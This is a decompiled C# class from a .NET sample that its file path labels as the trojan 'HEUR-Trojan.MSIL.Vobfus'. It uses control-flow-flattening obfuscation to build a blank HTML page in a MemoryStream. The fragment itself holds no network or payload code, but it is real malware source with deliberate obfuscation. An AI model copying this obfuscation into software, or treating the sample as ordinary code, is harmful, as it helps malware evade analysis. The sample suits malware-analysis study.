// Decompiled with JetBrains decompiler
// Type: c.Specifications.Exception
// Assembly: c, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCB3E154-F36D-403E-8019-8861E9AEB8FC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Vobfus.gen-191db013c67081442ef5e75edd00c2572f6ec9d7f629ddac9bba8942722c061d.exe

using GLuaR.Importers;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace c.Specifications
{
  internal class Exception
  {
    private string m_Request;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Exception()
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              ImporterMapper.InitAccount();
              num2 = 2;
              continue;
            case 1:
            case 2:
              this.m_Request = "";
              goto case 3;
            case 3:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              if (Exception.ListManager())
              {
                num2 = 5;
                continue;
              }
              goto case 0;
            case 5:
              goto label_7;
            default:
              goto label_4;
          }
        }
label_4:
        num1 = 3;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    ~Exception()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void FindField(string reference) => this.m_Request += reference;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public MemoryStream RestartField()
    {
      int num1 = 0;
      MemoryStream memoryStream;
      while (true)
      {
        int num2 = num1;
        string s;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_6;
            case 1:
            case 3:
              s = s.Replace("\n", "<br>");
              goto case 2;
            case 2:
            case 4:
              memoryStream = new MemoryStream(Encoding.ASCII.GetBytes(s));
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_6;
            case 5:
              goto label_7;
            default:
              goto label_4;
          }
        }
label_4:
        num1 = 4;
        continue;
label_6:
        s = this.m_Request;
        num1 = 3;
      }
label_7:
      return memoryStream;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void VisitField() => this.FindField("<html><head><title>Blank</title></head><body>");

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ResetField() => this.FindField("</body></html>");

    internal static bool ListManager() => true;

    internal static bool CalculateManager() => false;
  }
}
